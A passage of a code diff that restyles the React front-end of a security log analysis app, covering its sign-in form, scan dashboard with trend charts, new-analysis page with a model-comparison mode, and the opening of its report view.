+      if(mode==='signup'&&!res.data.session){setIsErr(false);setMsg('Check your email to confirm, then sign in.');return;}
       onSuccess(res.data.user);
-    } catch (err) { setIsErr(true); setMsg(err.message); }
-    finally { setLoading(false); }
+    }catch(err){setIsErr(true);setMsg(err.message);}finally{setLoading(false);}
   }
-
   return (
-    <div className="min-h-screen bg-[#080a0e] flex items-center justify-center p-4">
-      <div className="w-full max-w-sm">
-        <div className="text-center mb-8">
-          <div className="w-12 h-12 rounded-2xl bg-blue-600 flex items-center justify-center text-2xl mx-auto mb-4">🛡</div>
-          <h2 className="text-xl font-bold text-white">{mode==='login'?'Welcome back':'Create account'}</h2>
-        </div>
-        <Card className="p-6">
-          <form onSubmit={submit} className="space-y-4">
-            {[['Email','email',email,setEmail,'you@example.com'],['Password','password',password,setPassword,'••••••••']].map(([l,t,v,s,p]) => (
-              <div key={l}>
-                <label className="block text-xs font-medium text-slate-400 mb-1.5">{l}</label>
-                <input type={t} value={v} onChange={e=>s(e.target.value)} required minLength={t==='password'?6:undefined}
-                  className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-2.5 text-white text-sm placeholder-slate-600 focus:border-blue-500/50 focus:outline-none focus:ring-1 focus:ring-blue-500/20 transition-colors"
-                  placeholder={p} />
+    <div style={{ minHeight:'100vh', background:'#F5F7FA', display:'flex', flexDirection:'column' }}>
+      <Header user={null} onHome={()=>{}} />
+      <div style={{ flex:1, display:'flex', alignItems:'center', justifyContent:'center', padding:24 }}>
+        <div style={{ width:'100%', maxWidth:400 }}>
+          <div style={{ textAlign:'center', marginBottom:32 }}>
+            <div style={{ display:'flex', justifyContent:'center', marginBottom:16 }}><ShieldLogo size={40} /></div>
+            <h1 style={{ fontSize:24, fontWeight:500, color:'#1a1a2e' }}>{mode==='login'?'Welcome back':'Create account'}</h1>
+            <p style={{ fontSize:14, color:'#888', marginTop:4 }}>ThreatAnalyzer — AI-powered security</p>
+          </div>
+          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24 }}>
+            <form onSubmit={submit} style={{ display:'flex', flexDirection:'column', gap:16 }}>
+              <div>
+                <label style={{ display:'block', fontSize:12, color:'#888', marginBottom:6 }}>Email address</label>
+                <input type="email" value={email} onChange={e=>setEmail(e.target.value)} required
+                  style={{ width:'100%', padding:'10px 14px', borderRadius:8, border:`0.5px solid ${COLORS.border}`,
+                    fontSize:14, color:'#1a1a2e', outline:'none', boxSizing:'border-box' }}
+                  placeholder="you@example.com" />
               </div>
-            ))}
-            {msg && <div className={`text-xs px-3 py-2.5 rounded-lg border ${isErr?'bg-red-500/10 border-red-500/20 text-red-400':'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'}`}>{msg}</div>}
-            <button type="submit" disabled={loading}
-              className="w-full py-2.5 bg-blue-600 hover:bg-blue-500 disabled:bg-white/5 disabled:text-slate-600 text-white font-semibold text-sm rounded-lg transition-colors">
-              {loading ? 'Please wait…' : mode==='login' ? 'Sign In' : 'Create Account'}
+              <div>
+                <label style={{ display:'block', fontSize:12, color:'#888', marginBottom:6 }}>Password</label>
+                <input type="password" value={pw} onChange={e=>setPw(e.target.value)} required minLength={6}
+                  style={{ width:'100%', padding:'10px 14px', borderRadius:8, border:`0.5px solid ${COLORS.border}`,
+                    fontSize:14, color:'#1a1a2e', outline:'none', boxSizing:'border-box' }}
+                  placeholder="••••••••" />
+              </div>
+              {msg && (
+                <div style={{ padding:'10px 14px', borderRadius:8, fontSize:13,
+                  background: isErr ? COLORS.dangerLt : COLORS.successLt,
+                  color: isErr ? COLORS.danger : COLORS.success,
+                  border:`0.5px solid ${isErr?COLORS.danger:COLORS.success}44` }}>{msg}</div>
+              )}
+              <button type="submit" disabled={loading} style={{ ...btnPrimary, width:'100%', opacity:loading?0.7:1 }}>
+                {loading?'Please wait…':mode==='login'?'Sign In':'Create Account'}
+              </button>
+            </form>
+          </div>
+          <p style={{ textAlign:'center', fontSize:13, color:'#888', marginTop:16 }}>
+            {mode==='login'?"Don't have an account? ":"Already have an account? "}
+            <button onClick={onSwitch} style={{ background:'none', border:'none', cursor:'pointer', color:COLORS.primary, fontSize:13, fontWeight:500 }}>
+              {mode==='login'?'Sign up free':'Sign in'}
             </button>
-          </form>
-        </Card>
-        <p className="text-center text-xs text-slate-600 mt-4">
-          {mode==='login' ? "Don't have an account? " : 'Already have an account? '}
-          <button onClick={onSwitch} className="text-blue-400 hover:text-blue-300 font-medium">{mode==='login'?'Sign up free':'Sign in'}</button>
-        </p>
+          </p>
+        </div>
       </div>
+      <Footer />
     </div>
   );
 }
@@ -558,161 +965,141 @@ function Auth({ mode, onSuccess, onSwitch }) {
 // DASHBOARD
 // ══════════════════════════════════════════════════════════════
 function Dashboard({ user, onNewScan, onViewScan }) {
-  const [scans, setScans] = useState([]);
-  const [loading, setLoading] = useState(true);
-  const [search, setSearch] = useState('');
-  const [filterSev, setFilterSev] = useState('ALL');
-  const [activeTab, setActiveTab] = useState('scans');
+  const [scans,setScans]=useState([]);const[loading,setLoading]=useState(true);
+  const [search,setSearch]=useState('');const[filterSev,setFilterSev]=useState('ALL');
+  const [tab,setTab]=useState('scans');
 
-  useEffect(() => {
-    apiFetch('/api/scans').then(d => { setScans(d.scans||[]); setLoading(false); }).catch(()=>setLoading(false));
-  }, []);
+  useEffect(()=>{apiFetch('/api/scans').then(d=>{setScans(d.scans||[]);setLoading(false);}).catch(()=>setLoading(false));},[]);
 
-  const filtered = scans.filter(s => {
-    const matchSearch = !search || (s.title||'').toLowerCase().includes(search.toLowerCase()) || s.severity?.toLowerCase().includes(search.toLowerCase()) || (s.tags||[]).some(t => t.toLowerCase().includes(search.toLowerCase()));
-    const matchSev = filterSev === 'ALL' || s.severity === filterSev;
-    return matchSearch && matchSev;
+  const filtered=scans.filter(s=>{
+    const ms=!search||(s.title||'').toLowerCase().includes(search.toLowerCase())||s.severity?.toLowerCase().includes(search.toLowerCase())||(s.tags||[]).some(t=>t.toLowerCase().includes(search.toLowerCase()));
+    return ms&&(filterSev==='ALL'||s.severity===filterSev);
   });
 
   return (
-    <div className="min-h-screen bg-[#080a0e]">
-      <div className="max-w-5xl mx-auto px-4 md:px-6 py-6 md:py-8">
-
-        {/* Header */}
-        <div className="flex items-center justify-between mb-6 md:mb-8">
+    <Page>
+      <Header user={user} onNewScan={onNewScan} onAccount={()=>{}} onHome={()=>{}} />
+      <Container style={{ padding:'32px 24px', flex:1 }}>
+        <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:24 }}>
           <div>
-            <h1 className="text-lg md:text-xl font-bold text-white">Dashboard</h1>
-            <p className="text-slate-500 text-xs md:text-sm mt-0.5 truncate max-w-xs">{user?.email}</p>
+            <h1 style={{ fontSize:22, fontWeight:500, color:'#1a1a2e' }}>Dashboard</h1>
+            <p style={{ fontSize:13, color:'#888', marginTop:2 }}>{user?.email}</p>
           </div>
-          <button onClick={onNewScan} className="flex items-center gap-1.5 px-3 md:px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-xs md:text-sm font-medium rounded-xl transition-colors shadow-lg shadow-blue-600/20">
-            + New Analysis
-          </button>
+          <button onClick={onNewScan} style={btnPrimary}>+ New analysis</button>
         </div>
 
         {/* Stats */}
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-5">
-          {[['Total',scans.length,'📋'],['Critical',scans.filter(s=>s.severity==='CRITICAL').length,'🔴'],['High',scans.filter(s=>s.severity==='HIGH').length,'🟠'],['Avg Score',scans.length?Math.round(scans.reduce((a,s)=>a+(s.risk_score||0),0)/scans.length):0,'📊']].map(([l,v,icon]) => (
-            <Card key={l} className="p-4">
-              <div className="flex items-center justify-between mb-1">
-                <span className="text-slate-500 text-xs uppercase tracking-wider">{l}</span>
-                <span className="text-base">{icon}</span>
-              </div>
-              <div className="text-2xl font-black text-white">{v}</div>
-            </Card>
+        <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit,minmax(160px,1fr))', gap:12, marginBottom:24 }}>
+          {[['Total scans',scans.length],['Critical',scans.filter(s=>s.severity==='CRITICAL').length],
+            ['High',scans.filter(s=>s.severity==='HIGH').length],
+            ['Avg score',scans.length?Math.round(scans.reduce((a,s)=>a+(s.risk_score||0),0)/scans.length):0]
+          ].map(([label,val])=>(
+            <div key={label} style={{ background:'#F5F7FA', borderRadius:8, padding:16 }}>
+              <p style={{ fontSize:12, color:'#888', textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:4 }}>{label}</p>
+              <p style={{ fontSize:24, fontWeight:500, color:'#1a1a2e' }}>{val}</p>
+            </div>
           ))}
         </div>
 
         {/* Tabs */}
-        <div className="flex gap-1 mb-5 bg-white/[0.03] border border-white/[0.06] rounded-xl p-1 w-fit">
-          {[['scans','📋 Scans'],['trends','📊 Trends']].map(([id,label]) => (
-            <button key={id} onClick={()=>setActiveTab(id)}
-              className={`px-4 py-1.5 rounded-lg text-xs font-medium transition-all ${activeTab===id?'bg-white/10 text-white':'text-slate-500 hover:text-slate-300'}`}>
+        <div style={{ display:'flex', gap:2, background:'#F5F7FA', borderRadius:8, padding:3, width:'fit-content', marginBottom:20, border:`0.5px solid ${COLORS.border}` }}>
+          {[['scans','Scans'],['trends','Trends']].map(([id,label])=>(
+            <button key={id} onClick={()=>setTab(id)}
+              style={{ padding:'6px 20px', borderRadius:6, fontSize:13, cursor:'pointer', fontWeight:500,
+                background: tab===id?'#fff':'transparent', color: tab===id?'#1a1a2e':'#888',
+                border: tab===id?`0.5px solid ${COLORS.border}`:'none', transition:'all 0.15s' }}>
               {label}
             </button>
           ))}
         </div>
 
-        {/* Scans tab */}
-        {activeTab === 'scans' && (
-          <Card>
-            {/* Search & filter */}
-            <div className="px-4 md:px-6 py-4 border-b border-white/[0.06] flex flex-col sm:flex-row gap-3">
-              <div className="flex-1 relative">
-                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-600 text-sm">🔍</span>
+        {tab==='scans' && (
+          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, overflow:'hidden' }}>
+            <div style={{ padding:'16px 20px', borderBottom:`0.5px solid ${COLORS.border}`, display:'flex', gap:12, flexWrap:'wrap' }}>
+              <div style={{ flex:1, position:'relative', minWidth:200 }}>
+                <span style={{ position:'absolute', left:10, top:'50%', transform:'translateY(-50%)', fontSize:14, color:'#aaa' }}>🔍</span>
                 <input value={search} onChange={e=>setSearch(e.target.value)}
-                  className="w-full bg-white/5 border border-white/10 rounded-lg pl-8 pr-3 py-2 text-white text-xs placeholder-slate-600 focus:border-blue-500/50 focus:outline-none"
+                  style={{ width:'100%', paddingLeft:32, paddingRight:12, paddingTop:8, paddingBottom:8, borderRadius:8,
+                    border:`0.5px solid ${COLORS.border}`, fontSize:13, outline:'none', boxSizing:'border-box', color:'#1a1a2e' }}
                   placeholder="Search by title, tag, severity…" />
               </div>
               <select value={filterSev} onChange={e=>setFilterSev(e.target.value)}
-                className="bg-white/5 border border-white/10 rounded-lg px-3 py-2 text-xs text-slate-300 focus:outline-none focus:border-blue-500/50">
-                {['ALL','CRITICAL','HIGH','MEDIUM','LOW'].map(s => <option key={s} value={s} className="bg-[#0f1117]">{s === 'ALL' ? 'All Severities' : s}</option>)}
+                style={{ padding:'8px 12px', borderRadius:8, border:`0.5px solid ${COLORS.border}`, fontSize:13, color:'#555', outline:'none', background:'#fff' }}>
+                {['ALL','CRITICAL','HIGH','MEDIUM','LOW'].map(s=><option key={s} value={s}>{s==='ALL'?'All severities':s}</option>)}
               </select>
-              <button onClick={onNewScan} className="text-blue-400 hover:text-blue-300 text-xs font-medium whitespace-nowrap transition-colors">+ New</button>
             </div>
-
-            {loading ? (
-              <div className="py-16 text-center text-slate-600 text-sm">Loading…</div>
-            ) : filtered.length === 0 ? (
-              <div className="py-16 text-center">
-                <div className="text-3xl mb-3">🔍</div>
-                <p className="text-slate-400 font-medium text-sm mb-1">{scans.length === 0 ? 'No analyses yet' : 'No results found'}</p>
-                <p className="text-slate-600 text-xs mb-5">{scans.length === 0 ? 'Paste a log file to get your first threat report' : 'Try adjusting your search or filter'}</p>
-                {scans.length === 0 && <button onClick={onNewScan} className="px-5 py-2 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-lg transition-colors">Run First Analysis</button>}
+            {loading ? <p style={{ padding:48, textAlign:'center', color:'#aaa', fontSize:14 }}>Loading…</p>
+            : filtered.length===0 ? (
+              <div style={{ padding:48, textAlign:'center' }}>
+                <div style={{ fontSize:36, marginBottom:12 }}>🔍</div>
+                <p style={{ fontWeight:500, color:'#1a1a2e', marginBottom:6 }}>{scans.length===0?'No analyses yet':'No results found'}</p>
+                <p style={{ fontSize:13, color:'#888', marginBottom:20 }}>{scans.length===0?'Paste a log file to get your first threat report':'Try adjusting your search or filter'}</p>
+                {scans.length===0 && <button onClick={onNewScan} style={btnPrimary}>Run first analysis</button>}
               </div>
-            ) : (
-              <div className="divide-y divide-white/[0.04]">
-                {filtered.map(scan => (
-                  <div key={scan.id} className="px-4 md:px-6 py-4 flex items-center gap-3 md:gap-4 hover:bg-white/[0.02] transition-colors group">
-                    <div className={`w-2 h-2 rounded-full flex-shrink-0 ${getSev(scan.severity).dot}`} />
-                    <div className="flex-1 min-w-0">
-                      <div className="flex flex-wrap items-center gap-2 mb-1">
-                        <Badge level={scan.severity} />
-                        <span className="text-white text-sm font-semibold truncate">{scan.title || `Risk ${scan.risk_score}/100`}</span>
-                      </div>
-                      <div className="flex flex-wrap items-center gap-2">
-                        <span className="text-slate-500 text-xs">{new Date(scan.created_at).toLocaleString('en-IN',{dateStyle:'medium',timeStyle:'short'})}</span>
-                        {(scan.tags||[]).slice(0,3).map(tag => (
-                          <span key={tag} className="text-[10px] bg-blue-500/10 border border-blue-500/20 text-blue-400 px-1.5 py-0.5 rounded">{tag}</span>
-                        ))}
-                        {scan.is_public && <span className="text-[10px] bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 px-1.5 py-0.5 rounded">🔗 Public</span>}
-                      </div>
-                    </div>
-                    <button onClick={()=>onViewScan(scan.id)} className="text-xs text-slate-600 group-hover:text-blue-400 font-medium transition-colors flex-shrink-0">
-                      View →
-                    </button>
+            ) : filtered.map((scan,i)=>(
+              <div key={scan.id} style={{ padding:'14px 20px', borderTop:i===0?'none':`0.5px solid ${COLORS.border}`,
+                display:'flex', alignItems:'center', gap:12, cursor:'pointer', transition:'background 0.15s' }}
+                onMouseEnter={e=>e.currentTarget.style.background='#F5F7FA'}
+                onMouseLeave={e=>e.currentTarget.style.background='#fff'}
+                onClick={()=>onViewScan(scan.id)}>
+                <div style={{ width:8, height:8, borderRadius:'50%', flexShrink:0, background:sevColor(scan.severity) }} />
+                <div style={{ flex:1, minWidth:0 }}>
+                  <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:3 }}>
+                    <SevBadge level={scan.severity} />
+                    <span style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
+                      {scan.title || `Risk ${scan.risk_score}/100`}
+                    </span>
                   </div>
-                ))}
+                  <div style={{ display:'flex', gap:8, alignItems:'center', flexWrap:'wrap' }}>
+                    <span style={{ fontSize:12, color:'#aaa' }}>{new Date(scan.created_at).toLocaleString('en-IN',{dateStyle:'medium',timeStyle:'short'})}</span>
+                    {(scan.tags||[]).slice(0,3).map(tag=>(
+                      <span key={tag} style={{ fontSize:11, background:COLORS.primaryLt, color:COLORS.primary, padding:'1px 8px', borderRadius:99 }}>{tag}</span>
+                    ))}
+                    {scan.is_public && <span style={{ fontSize:11, background:COLORS.successLt, color:COLORS.success, padding:'1px 8px', borderRadius:99 }}>🔗 Public</span>}
+                  </div>
+                </div>
+                <span style={{ fontSize:13, color:COLORS.primary, flexShrink:0, fontWeight:500 }}>View →</span>
               </div>
-            )}
-          </Card>
+            ))}
+          </div>
         )}
 
-        {/* Trends tab */}
-        {activeTab === 'trends' && (
-          <div className="space-y-4">
+        {tab==='trends' && (
+          <div style={{ display:'flex', flexDirection:'column', gap:16 }}>
             {scans.length < 2 ? (
-              <Card className="p-10 text-center">
-                <div className="text-4xl mb-3">📊</div>
-                <p className="text-slate-400 font-medium text-sm mb-1">Not enough data yet</p>
-                <p className="text-slate-600 text-xs">Run at least 2 analyses to see trend charts</p>
-              </Card>
+              <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:48, textAlign:'center' }}>
+                <div style={{ fontSize:36, marginBottom:12 }}>📊</div>
+                <p style={{ fontWeight:500, color:'#1a1a2e', marginBottom:4 }}>Not enough data yet</p>
+                <p style={{ fontSize:13, color:'#888' }}>Run at least 2 analyses to see trend charts</p>
+              </div>
             ) : (
-              <>
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                  <Card className="p-5">
-                    <h3 className="font-semibold text-sm text-white mb-4">Severity Breakdown</h3>
-                    <SeverityPieChart scans={scans} />
-                  </Card>
-                  <Card className="p-5">
-                    <h3 className="font-semibold text-sm text-white mb-4">Risk Score Trend</h3>
-                    <RiskLineChart scans={scans} />
-                  </Card>
+              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:16 }}>
+                <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+                  <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:16 }}>Severity breakdown</p>
+                  <ResponsiveContainer width="100%" height={180}>
+                    <PieChart><Pie data={['CRITICAL','HIGH','MEDIUM','LOW'].map((s,i)=>({name:s,value:scans.filter(sc=>sc.severity===s).length})).filter(d=>d.value>0)} cx="50%" cy="50%" innerRadius={45} outerRadius={70} paddingAngle={3} dataKey="value">
+                      {['CRITICAL','HIGH','MEDIUM','LOW'].map((_,i)=><Cell key={i} fill={[COLORS.danger,'#993C1D',COLORS.warning,COLORS.success][i]} />)}
+                    </Pie><Tooltip contentStyle={{ borderRadius:8, fontSize:12, border:`0.5px solid ${COLORS.border}` }} /></PieChart>
+                  </ResponsiveContainer>
                 </div>
-                <Card className="p-5">
-                  <h3 className="font-semibold text-sm text-white mb-4">Scans Per Day (Last 7 Days)</h3>
-                  <DailyScanChart scans={scans} />
-                </Card>
-                <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
-                  {['CRITICAL','HIGH','MEDIUM','LOW'].map(sev => {
-                    const sevScans = scans.filter(s => s.severity === sev);
-                    const s = getSev(sev);
-                    return (
-                      <Card key={sev} className={`p-4 border ${s.border}`}>
-                        <div className={`text-xs font-medium uppercase tracking-wider mb-2 ${s.text}`}>{sev}</div>
-                        <div className="text-2xl font-black text-white">{sevScans.length}</div>
-                        <div className="text-xs text-slate-500 mt-1">
-                          {sevScans.length > 0 ? `Avg: ${Math.round(sevScans.reduce((a,s)=>a+(s.risk_score||0),0)/sevScans.length)}` : 'No scans'}
-                        </div>
-                      </Card>
-                    );
-                  })}
+                <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+                  <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:16 }}>Risk score trend</p>
+                  <ResponsiveContainer width="100%" height={180}>
+                    <LineChart data={[...scans].reverse().slice(-15).map((s,i)=>({name:`#${i+1}`,score:s.risk_score||0}))} margin={{top:5,right:10,left:-20,bottom:5}}>
+                      <CartesianGrid strokeDasharray="3 3" stroke="#eee" />
+                      <XAxis dataKey="name" tick={{fill:'#aaa',fontSize:10}} axisLine={false} tickLine={false} />
+                      <YAxis domain={[0,100]} tick={{fill:'#aaa',fontSize:10}} axisLine={false} tickLine={false} />
+                      <Tooltip contentStyle={{ borderRadius:8, fontSize:12, border:`0.5px solid ${COLORS.border}` }} />
+                      <Line type="monotone" dataKey="score" stroke={COLORS.primary} strokeWidth={2} dot={{ fill:COLORS.primary, r:3 }} />
+                    </LineChart>
+                  </ResponsiveContainer>
                 </div>
-              </>
+              </div>
             )}
           </div>
         )}
-      </div>
-    </div>
+      </Container>
+    </Page>
   );
 }
 
@@ -720,283 +1107,321 @@ function Dashboard({ user, onNewScan, onViewScan }) {
 // NEW SCAN
 // ══════════════════════════════════════════════════════════════
 function NewScan({ onComplete, onBack }) {
-  const [input, setInput] = useState('');
-  const [file, setFile] = useState(null);
-  const [state, setState] = useState('idle');
-  const [error, setError] = useState('');
-  const fileRef = useRef();
+  const [input,setInput]=useState('');const[file,setFile]=useState(null);
+  const [state,setState]=useState('idle');const[error,setError]=useState('');
+  const [mode,setMode]=useState('stream');
+  const fileRef=useRef();
 
   return (
-    <div className="min-h-screen bg-[#080a0e]">
-      <div className="max-w-3xl mx-auto px-4 md:px-6 py-6 md:py-8">
-        <div className="flex items-center gap-2 mb-8">
-          <button onClick={onBack} className="text-slate-500 hover:text-white text-sm transition-colors">← Back</button>
-          <span className="text-slate-700">/</span>
-          <span className="text-sm text-slate-400">New Analysis</span>
+    <Page>
+      <Header user={{}} onNewScan={()=>{}} onHome={onBack} />
+      <Container style={{ padding:'32px 24px', flex:1 }}>
+        <div style={{ marginBottom:24, display:'flex', alignItems:'center', gap:12 }}>
+          <button onClick={onBack} style={{ background:'none', border:'none', cursor:'pointer', color:'#888', fontSize:14 }}>← Back</button>
+          <span style={{ color:'#ddd' }}>/</span>
+          <h1 style={{ fontSize:18, fontWeight:500, color:'#1a1a2e' }}>New analysis</h1>
         </div>
 
-        {state === 'streaming' ? (
-          <Card className="p-6 md:p-8">
-            <StreamingAnalysis
-              input={input}
-              file={file}
-              onComplete={(result) => { onComplete(result); }}
-              onError={(msg) => { setState('error'); setError(msg); }}
-            />
-          </Card>
+        {state==='streaming' ? (
+          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24 }}>
+            <StreamLoader input={input} onComplete={(r,sid)=>onComplete(r,sid)} onError={msg=>{setState('error');setError(msg);}} />
+          </div>
+        ) : state==='comparing' ? (
+          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24 }}>
+            <CompareRunner input={input} onBack={()=>setState('idle')} />
+          </div>
         ) : (
-          <div className="space-y-4">
-            <Card>
-              <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.06]">
-                <span className="text-sm font-medium text-white">Security Log Input</span>
-                <div className="flex gap-3">
-                  <button onClick={()=>{setInput(SAMPLE);setFile(null);}} className="text-xs text-blue-400 hover:text-blue-300 transition-colors">Load sample</button>
-                  {(input||file) && <button onClick={()=>{setInput('');setFile(null);}} className="text-xs text-slate-600 hover:text-slate-400 transition-colors">Clear</button>}
-                </div>
-              </div>
-              <textarea value={input} onChange={e=>{setInput(e.target.value);setFile(null);}}
-                className="w-full bg-transparent font-mono text-emerald-400/80 text-xs p-4 resize-none focus:outline-none leading-relaxed min-h-56"
-                placeholder={"Paste firewall logs, SIEM events, IOCs, network captures…\n\nClick 'Load sample' to see an example APT attack log."}
-                spellCheck={false} />
-            </Card>
-
-            <div onClick={()=>fileRef.current?.click()} onDragOver={e=>e.preventDefault()}
-              onDrop={e=>{e.preventDefault();const f=e.dataTransfer.files[0];if(f){setFile(f);setInput('');}}}
-              className={`border-2 border-dashed rounded-2xl p-5 text-center cursor-pointer transition-all ${file?'border-emerald-500/40 bg-emerald-500/5':'border-white/10 hover:border-white/20'}`}>
-              <input ref={fileRef} type="file" accept=".txt,.log,.json,.csv" className="hidden"
-                onChange={e=>{const f=e.target.files[0];if(f){setFile(f);setInput('');}}} />
-              {file ? (
-                <div className="flex items-center justify-center gap-2 text-emerald-400 text-sm font-mono">
-                  <span>📄</span><span>{file.name}</span><span className="text-emerald-600">({(file.size/1024).toFixed(1)} KB)</span>
-                </div>
-              ) : (
-                <>
-                  <p className="text-slate-500 text-sm">Drop a file here or <span className="text-blue-400">browse</span></p>
-                  <p className="text-slate-700 text-xs mt-1">.txt · .log · .json · .csv · max 5 MB</p>
-                </>
-              )}
+          <div style={{ display:'flex', flexDirection:'column', gap:16 }}>
+            {/* Mode selector */}
+            <div style={{ display:'flex', gap:2, background:'#F5F7FA', borderRadius:8, padding:3, width:'fit-content', border:`0.5px solid ${COLORS.border}` }}>
+              {[['stream','🔴 Live analysis'],['compare','⚔️ Compare models']].map(([id,label])=>(
+                <button key={id} onClick={()=>setMode(id)}
+                  style={{ padding:'7px 20px', borderRadius:6, fontSize:13, cursor:'pointer', fontWeight:500,
+                    background:mode===id?'#fff':'transparent', color:mode===id?'#1a1a2e':'#888',
+                    border:mode===id?`0.5px solid ${COLORS.border}`:'none' }}>
+                  {label}
+                </button>
+              ))}
             </div>
 
-            {error && <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-4 text-red-400 text-sm">{error}</div>}
+            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24 }}>
+              <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:12 }}>
+                <span style={{ fontSize:14, fontWeight:500, color:'#1a1a2e' }}>Security log input</span>
+                <div style={{ display:'flex', gap:12 }}>
+                  <button onClick={()=>{setInput(SAMPLE);setFile(null);}} style={{ background:'none', border:'none', cursor:'pointer', fontSize:13, color:COLORS.primary }}>Load sample</button>
+                  {(input||file)&&<button onClick={()=>{setInput('');setFile(null);}} style={{ background:'none', border:'none', cursor:'pointer', fontSize:13, color:'#aaa' }}>Clear</button>}
+                </div>
+              </div>
+              <div style={{ display:'flex', gap:12 }}>
+                <textarea value={input} onChange={e=>{setInput(e.target.value);setFile(null);}}
+                  style={{ flex:1, height:140, resize:'vertical', fontSize:13, padding:14, lineHeight:1.6,
+                    border:`0.5px solid ${COLORS.border}`, borderRadius:8, fontFamily:'monospace',
+                    color:'#1a1a2e', outline:'none', boxSizing:'border-box' }}
+                  placeholder={"Paste firewall logs, SIEM events, IOCs…\n\nClick 'Load sample' to see an example."} spellCheck={false} />
+                <div style={{ display:'flex', flexDirection:'column', gap:8, flexShrink:0 }}>
+                  <button onClick={()=>fileRef.current?.click()} style={{ ...btnSecondary, display:'flex', alignItems:'center', gap:6, whiteSpace:'nowrap', fontSize:13 }}>
+                    <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
+                      <path d="M14 10v3H2v-3M8 2v8M5 5l3-3 3 3" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+                    </svg>
+                    Upload file
+                  </button>
+                  <span style={{ fontSize:11, color:'#aaa', textAlign:'center' }}>or drag & drop</span>
+                </div>
+              </div>
+              <input ref={fileRef} type="file" accept=".txt,.log,.json,.csv" style={{ display:'none' }}
+                onChange={e=>{const f=e.target.files[0];if(f){setFile(f);setInput('');}}} />
 
-            <button onClick={()=>{if(!input.trim()&&!file){setError('Please paste log data or upload a file.');return;} setState('streaming');setError('');}}
-              disabled={!input.trim()&&!file}
-              className="w-full py-3 bg-blue-600 hover:bg-blue-500 disabled:bg-white/5 disabled:text-slate-600 text-white font-semibold rounded-xl transition-colors text-sm shadow-lg shadow-blue-600/20 disabled:shadow-none">
-              🔴 Analyse with Live AI Stream
-            </button>
-            <p className="text-center text-slate-700 text-xs">Raw input is never stored · Results are private to your account</p>
+              {/* File indicator */}
+              {file && (
+                <div style={{ marginTop:10, display:'flex', alignItems:'center', gap:8, padding:'8px 12px', background:COLORS.successLt, borderRadius:8, border:`0.5px solid ${COLORS.success}44` }}>
+                  <span style={{ fontSize:14 }}>📄</span>
+                  <span style={{ fontSize:13, color:COLORS.success, fontFamily:'monospace' }}>{file.name} ({(file.size/1024).toFixed(1)} KB)</span>
+                  <button onClick={()=>setFile(null)} style={{ marginLeft:'auto', background:'none', border:'none', cursor:'pointer', color:COLORS.success, fontSize:16 }}>×</button>
+                </div>
+              )}
+
+              {/* Drop zone hint */}
+              {!file && !input && (
+                <div style={{ marginTop:12, padding:'14px', borderRadius:8, border:`1.5px dashed ${COLORS.border}`, textAlign:'center', color:'#aaa', fontSize:13 }}>
+                  .txt · .log · .json · .csv — max 5 MB
+                </div>
+              )}
+
+              {error && (
+                <div style={{ marginTop:12, padding:'10px 14px', borderRadius:8, fontSize:13,
+                  background:COLORS.dangerLt, color:COLORS.danger, border:`0.5px solid ${COLORS.danger}44` }}>{error}</div>
+              )}
+
+              <div style={{ marginTop:16, display:'flex', justifyContent:'flex-end' }}>
+                <button onClick={()=>{ if(!input.trim()&&!file){setError('Please paste log data or upload a file.');return;} setError(''); setState(mode==='compare'?'comparing':'streaming'); }}
+                  disabled={!input.trim()&&!file}
+                  style={{ ...btnPrimary, display:'flex', alignItems:'center', gap:8, opacity:(!input.trim()&&!file)?0.5:1 }}>
+                  <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
+                    <circle cx="8" cy="8" r="6" stroke="#fff" strokeWidth="1.5" />
+                    <path d="M5 8l2 2 4-4" stroke="#fff" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+                  </svg>
+                  {mode==='compare' ? 'Compare two models' : 'Start analysis'}
+                </button>
+              </div>
+            </div>
+
+            <p style={{ textAlign:'center', fontSize:12, color:'#aaa' }}>Raw input is never stored · Results are private to your account</p>
           </div>
         )}
-      </div>
-    </div>
+      </Container>
+    </Page>
   );
 }
 
 // ══════════════════════════════════════════════════════════════
 // REPORT
 // ══════════════════════════════════════════════════════════════
-function Report({ result, scanId, isPublic: initialPublic, onBack, onNewScan, onToast }) {
+function Report({ result, scanId, isPublic:initPub, onBack, onNewScan, onToast }) {
   const [tab, setTab] = useState('overview');
-  const [tags, setTags] = useState([]);
-  const [isPublicState, setIsPublicState] = useState(initialPublic || false);
-
   if (!result) return null;
 
+  const score = result.riskScore || 0;
   const tabs = [
-    { id:'overview', label:'Overview', icon:'📋' },
